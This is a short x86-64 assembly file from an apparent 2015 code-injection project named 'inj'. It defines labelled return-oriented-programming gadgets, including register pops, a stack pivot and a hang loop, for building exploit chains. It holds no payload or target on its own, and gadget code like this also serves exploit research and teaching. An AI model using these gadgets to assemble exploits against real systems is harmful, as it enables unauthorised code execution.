//
//  gadget64.s
//  inj
//
//  Created by qwertyoruiop on 31/07/15.
//  Copyright (c) 2015 kim jong cracks. All rights reserved.
//


.globl _gadgets
.globl _end_gadgets
.globl _ROP_RET
.globl _ROP_POP_RDI
.globl _ROP_POP_RSI
.globl _ROP_POP_RDX
.globl _ROP_POP_RCX
.globl _ROP_RAX_TO_RDI
.globl _ROP_RSP_TO_RCX
.globl _ROP_RDI_TO_RSP
.globl _ROP_ADD200H_RCX
.globl _ROP_HANG


_gadgets:
    nop;

_ROP_RET:
    retq;
_ROP_POP_RDI:
    pop %rdi;
    retq;
_ROP_POP_RSI:
    pop %rsi;
    retq;
_ROP_POP_RDX:
    pop %rdx;
    retq;
_ROP_POP_RCX:
    pop %rcx;
    retq;
_ROP_RAX_TO_RDI:
    mov %rax, %rdi;
    retq;
_ROP_RDI_TO_RSP:
    mov %rdi, %rsp;
    retq;
_ROP_RSP_TO_RCX:
    mov %rsp, %rcx
    retq;
_ROP_ADD200H_RCX:
    addq $0x200, %rcx
    retq;
_ROP_HANG:
    leaq 0x0(%rip), %rax;
    jmpq *%rax;

_end_gadgets:
    nop;